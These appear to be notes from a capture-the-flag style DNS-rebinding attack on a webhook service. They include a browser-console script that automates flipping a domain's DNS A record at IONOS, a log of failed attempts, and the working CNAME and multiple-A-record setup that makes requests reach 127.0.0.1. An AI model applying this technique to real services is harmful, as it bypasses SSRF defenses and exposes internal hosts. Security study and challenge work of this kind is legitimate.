* Register webhook with domain that does not resolve to localhost (private/local etc)

```
{
  "id": "3d6ebf6c-faee-495e-b3b2-90c39f026d46",
  "status": "registered",
  "url": "https://ss.<yourdomain>.com/flag"
}
```

* Payload - Flipping DNS from localhost -> some_other_ip (dummy non-existing or accessible to test)

```
(() => {
  // === CONFIG ===
  const recordUrl = 'https://my.ionos.com/edit-dns-record/<yourdomain>.com/1373846977';
  const ips = ['0.0.0.0', '142.250.73.142']; // flip between these
  const ttl = 60;                               // IONOS min TTL
  const forWwwSubdomain = false;                // from your curl
  const delayMs = 2000;                         // pause between edits

  let running = true;
  const sleep = ms => new Promise(r => setTimeout(r, ms));

  // Pull fresh CSRF-ish hidden inputs from the edit page each time
  async function getTokens() {
    const res = await fetch(recordUrl, {
      method: 'GET',
      credentials: 'include',
      headers: {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
      }
    });
    const html = await res.text();
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const tokens = {};
    doc.querySelectorAll('input[name^="__SBMT:"],input[name^="__SYNT:"]').forEach(el => {
      tokens[el.name] = el.value || '';
    });
    return tokens;
  }

  async function editTo(ip) {
    // collect fresh tokens (safer than reusing stale ones)
    let tokens = {};
    try { tokens = await getTokens(); } catch (e) { console.warn('Token fetch failed, using fallback names'); }

    const params = new URLSearchParams();
    params.set('__sendingdata', '1');
    params.set('record.forWwwSubdomain', String(forWwwSubdomain));
    params.set('record.value', ip);
    params.set('record.ttl', String(ttl));
    for (const [k, v] of Object.entries(tokens)) params.append(k, v);

    // fallback if page didn’t expose token names (use your provided ones)
    if (Object.keys(tokens).length === 0) {
      params.append('__SBMT:d0e6706d3:', '');
      params.append('__SYNT:d0e6706d3:linkId', 'ct.button.dns.editrecord.save');
    }

    const res = await fetch(recordUrl, {
      method: 'POST',
      credentials: 'include',
      redirect: 'manual', // don’t follow UI redirects; just log status
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
      },
      body: params.toString()
    });

    console.log(`[${new Date().toISOString()}] EDIT A -> ${ip} | status ${res.status}`);
    if (!res.ok && res.status !== 302) {
      const text = await res.text();
      console.warn('Non-OK response (first 200 chars):', text.slice(0, 200));
    }
  }

  (async function loop() {
    let i = 0;
    while (running) {
      const ip = ips[i++ % ips.length];
      await editTo(ip);
      await sleep(delayMs);
    }
  })();

  // Stopper
  window.stopIonosEditLoop = () => {
    running = false;
    console.log('Stopping edit loop…');
  };
})();
```

* Flipping did not work directly, the DNS TTL and time delay for swap is not enough to refresh or flush cache

* Multiple A record resolutions via `0.0.0.0, 1.0.0.3, 1.0.0.2, 127.0.0.1` allows the OS resolver to determine which to pick
  - for some reason, it always picked 127.0.0.1 even though we tried to refresh and round robin the IP addresses

* Blasting the server with intruder with flipping or multi DNS records did not work directly

* next: try leveraging https://github.com/nccgroup/singularity, pending to leverage it...

* using CNAME and multiple A record resolution allowed the rebinding to work
  - scn.<yourdomain>.com --> CNAME --> ss.<yourdomain>.com
  - ss.<yourdomain>.com --> A records --> 1.0.0.2, 1.0.0.3, 127.0.0.1 
    - requests will retry different Ips resulting in 127.0.0.1 reachability
    - requests has timeout of 5seconds allowing enough to retry
